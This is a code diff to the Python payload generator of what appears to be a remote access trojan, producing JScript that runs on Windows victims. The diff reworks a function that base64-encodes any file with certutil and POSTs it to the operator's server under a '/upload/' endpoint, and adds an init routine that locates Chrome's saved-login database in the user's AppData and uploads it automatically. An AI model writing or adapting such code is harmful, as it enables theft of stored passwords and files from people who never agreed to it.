@@ -178,26 +178,30 @@ class payload():
         path = path.replace('\\', '\\\\').replace('\"', '\\\"')
         p = '''
         var message;
-        try{
-            path = "%s";
-            tmp_path = path+".b64"
-            var fso = new ActiveXObject("Scripting.FileSystemObject")
-            if (fso.FileExists(tmp_path)) fso.DeleteFile(tmp_path);
-            r = new ActiveXObject("WScript.Shell").Run("certutil -encode "+path+" "+tmp_path,0,true);
-            fso1=new ActiveXObject("Scripting.FileSystemObject");
-            f=fso1.OpenTextFile(tmp_path,1);
-            message=f.ReadAll();
-            f.Close();
-            p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-            p.SetTimeouts(0, 0, 0, 0);
-            p.Open("POST","http://{{server}}/upload/{{signature}}?pid={{pid}}&filename="+escape(path),false);
-            p.Send(escape(message));
-            message = p.ResponseText
-            fso1=new ActiveXObject("Scripting.FileSystemObject");
-            f =fso1.GetFile(tmp_path);
-            f.Delete();
-        }catch(err){
-            message = err.message;
+        path = "%s";
+        fso = new ActiveXObject("Scripting.FileSystemObject")
+        if (!fso.FileExists(path)) message = 'file not exist!';
+        else{
+            try{
+                tmp_path = path+".b64"
+                var fso = new ActiveXObject("Scripting.FileSystemObject")
+                if (fso.FileExists(tmp_path)) fso.DeleteFile(tmp_path);
+                r = new ActiveXObject("WScript.Shell").Run("certutil -encode "+path+" "+tmp_path,0,true);
+                fso1=new ActiveXObject("Scripting.FileSystemObject");
+                f=fso1.OpenTextFile(tmp_path,1);
+                message=f.ReadAll();
+                f.Close();
+                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                p.SetTimeouts(0, 0, 0, 0);
+                p.Open("POST","http://{{server}}/upload/{{signature}}?pid={{pid}}&filename="+escape(path),false);
+                p.Send(escape(message));
+                message = p.ResponseText
+                fso1=new ActiveXObject("Scripting.FileSystemObject");
+                f =fso1.GetFile(tmp_path);
+                f.Delete();
+            }catch(err){
+                message = err.message;
+            }
         }
         p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
         p.SetTimeouts(0, 0, 0, 0);
@@ -305,5 +309,36 @@ class payload():
         p.SetTimeouts(0, 0, 0, 0);
         p.Open("POST","http://{{server}}/rat/{{signature}}?pid={{pid}}",false);
         p.Send(message);
+        '''
+        return data
+
+    def init(self):
+        data = '''
+        function upload(path){
+            if (!fso.FileExists(path)) return;
+            try{ 
+                tmp_path = path+".b64"
+                var fso = new ActiveXObject("Scripting.FileSystemObject")
+                if (fso.FileExists(tmp_path)) fso.DeleteFile(tmp_path);
+                r = new ActiveXObject("WScript.Shell").Run("certutil -encode "+path+" "+tmp_path,0,true);
+                fso1=new ActiveXObject("Scripting.FileSystemObject");
+                f=fso1.OpenTextFile(tmp_path,1);
+                message=f.ReadAll();
+                f.Close();
+                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+                p.SetTimeouts(0, 0, 0, 0);
+                p.Open("POST","http://{{server}}/upload/{{signature}}?pid={{pid}}&filename="+escape(path),false);
+                p.Send(escape(message));
+                message = p.ResponseText
+                fso1=new ActiveXObject("Scripting.FileSystemObject");
+                f =fso1.GetFile(tmp_path);
+                f.Delete();
+            }catch(err){
+                message = err.message;
+            }
+        }
+        appdata_path = new ActiveXObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
+        chrome_passfile = appdata_path+'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'
+        upload(chrome_passfile)
         '''
         return data
